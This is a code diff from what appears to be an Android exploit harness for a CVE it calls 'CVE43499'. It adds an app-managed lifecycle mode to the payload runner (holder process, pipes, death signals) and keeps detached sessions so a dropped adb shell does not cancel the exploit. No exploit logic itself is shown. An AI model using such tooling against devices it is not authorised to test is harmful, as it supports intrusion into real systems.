@@ -1118,9 +1118,95 @@ static pid_t follow_payload_log(const char *path, int transport_fd,
   }
 }
 
+static int managed_holder_main(
+    int lifetime_write_fd, int control_fd, int transport_fd) {
+  char command = 0;
+  if (lifetime_write_fd < 0 ||
+      prctl(PR_SET_PDEATHSIG, SIGKILL) != 0 || getppid() == 1) {
+    _exit(1);
+  }
+  if (!read_full(control_fd, &command, sizeof(command)) || command != 'R') {
+    _exit(1);
+  }
+  if (prctl(PR_SET_PDEATHSIG, 0) != 0 || setsid() < 0 ||
+      !write_full(control_fd, "A", 1)) {
+    _exit(1);
+  }
+  for (int fd = STDIN_FILENO; fd <= STDERR_FILENO; fd++) {
+    if (fd != lifetime_write_fd && fd != control_fd && fd != transport_fd) {
+      close(fd);
+    }
+  }
+  if (transport_fd != lifetime_write_fd && transport_fd != control_fd) {
+    close(transport_fd);
+  }
+  close(control_fd);
+  for (;;) {
+    pause();
+  }
+}
+
+static int create_managed_lifecycle(
+    int transport_fd, int *lifetime_read_fd, int *release_fd,
+    pid_t *holder_pid) {
+  int lifetime[2] = {-1, -1};
+  int control[2] = {-1, -1};
+  if (pipe2(lifetime, O_CLOEXEC) != 0 ||
+      socketpair(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0, control) != 0) {
+    int saved_errno = errno;
+    if (lifetime[0] >= 0) close(lifetime[0]);
+    if (lifetime[1] >= 0) close(lifetime[1]);
+    if (control[0] >= 0) close(control[0]);
+    if (control[1] >= 0) close(control[1]);
+    errno = saved_errno;
+    return 0;
+  }
+
+  pid_t holder = fork();
+  if (holder < 0) {
+    int saved_errno = errno;
+    close(lifetime[0]);
+    close(lifetime[1]);
+    close(control[0]);
+    close(control[1]);
+    errno = saved_errno;
+    return 0;
+  }
+  if (holder == 0) {
+    close(lifetime[0]);
+    close(control[0]);
+    managed_holder_main(lifetime[1], control[1], transport_fd);
+    _exit(1);
+  }
+
+  close(lifetime[1]);
+  close(control[1]);
+  *lifetime_read_fd = lifetime[0];
+  *release_fd = control[0];
+  *holder_pid = holder;
+  return 1;
+}
+
+static void stop_managed_holder(pid_t holder_pid) {
+  if (holder_pid <= 0) {
+    return;
+  }
+  kill(holder_pid, SIGKILL);
+  while (waitpid(holder_pid, NULL, 0) < 0 && errno == EINTR) {
+  }
+}
+
 static int payload_runner_main(int argc, char **argv) {
-  if (argc != 5) {
+  int app_managed = 0;
+  if (argc == 6 && strcmp(argv[5], "--app-managed") == 0) {
+    app_managed = 1;
+  } else if (argc != 5) {
     return 2;
+  }
+
+  if (app_managed &&
+      (prctl(PR_SET_PDEATHSIG, SIGKILL) != 0 || getppid() == 1)) {
+    return errno ? errno : ESRCH;
   }
 
   int transport_fd = fcntl(STDOUT_FILENO, F_DUPFD_CLOEXEC, 3);
@@ -1145,30 +1231,45 @@ static int payload_runner_main(int argc, char **argv) {
     return errno ? errno : EIO;
   }
 
-  /*
-   * RDB can drop while the allocator search is still running.  Keep a
-   * waitable foreground supervisor for normal adb behavior, but execute the
-   * payload in a new session so loss of the shell cannot kill the only run on
-   * this boot.  The child owns the persistent log and remains observable by
-   * the same helper process when the transport stays alive.
-   */
+  int lifetime_read_fd = -1;
+  int release_fd = -1;
+  pid_t holder_pid = -1;
+  if (app_managed &&
+      !create_managed_lifecycle(transport_fd, &lifetime_read_fd,
+                                &release_fd, &holder_pid)) {
+    close(transport_fd);
+    return errno ? errno : EIO;
+  }
+
+  /* Keep a waitable foreground supervisor while making its lifecycle explicit
+   * for App-managed runs.  Standalone adb runs retain their old detached
+   * session behavior so a dropped shell does not cancel the exploit. */
   signal(SIGHUP, SIG_IGN);
   pid_t payload_pid = fork();
   if (payload_pid < 0) {
+    stop_managed_holder(holder_pid);
+    if (lifetime_read_fd >= 0) close(lifetime_read_fd);
+    if (release_fd >= 0) close(release_fd);
     close(transport_fd);
     return errno;
   }
   if (payload_pid > 0) {
+    if (lifetime_read_fd >= 0) close(lifetime_read_fd);
+    if (release_fd >= 0) close(release_fd);
     int status = 0;
     pid_t waited = follow_payload_log(argv[4], transport_fd, payload_pid,
                                       &status);
     if (waited < 0) {
       int saved_errno = errno;
+      stop_managed_holder(holder_pid);
       relay_payload_log_tail(argv[4], transport_fd);
       close(transport_fd);
       return saved_errno;
     }
     close(transport_fd);
+    if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) {
+      stop_managed_holder(holder_pid);
+    }
     if (WIFEXITED(status)) {
       return WEXITSTATUS(status);
     }
@@ -1180,7 +1281,20 @@ static int payload_runner_main(int argc, char **argv) {
 
   close(transport_fd);
   signal(SIGHUP, SIG_IGN);
-  if (prctl(PR_SET_PDEATHSIG, 0) != 0 || setsid() < 0) {
+  if (app_managed) {
+    if (prctl(PR_SET_PDEATHSIG, SIGKILL) != 0 || getppid() == 1) {
+      return errno ? errno : ESRCH;
+    }
+    char lifetime_text[16];
+    char release_text[16];
+    snprintf(lifetime_text, sizeof(lifetime_text), "%d", lifetime_read_fd);
+    snprintf(release_text, sizeof(release_text), "%d", release_fd);
+    if (setenv("CVE43499_APP_MANAGED", "1", 1) != 0 ||
+        setenv("CVE43499_MANAGED_LIFETIME_FD", lifetime_text, 1) != 0 ||
+        setenv("CVE43499_MANAGED_RELEASE_FD", release_text, 1) != 0) {
+      return errno ? errno : EIO;
+    }
+  } else if (prctl(PR_SET_PDEATHSIG, 0) != 0 || setsid() < 0) {
     return errno ? errno : EPERM;
   }
   prctl(PR_SET_NAME, "cve43499-run", 0, 0, 0);
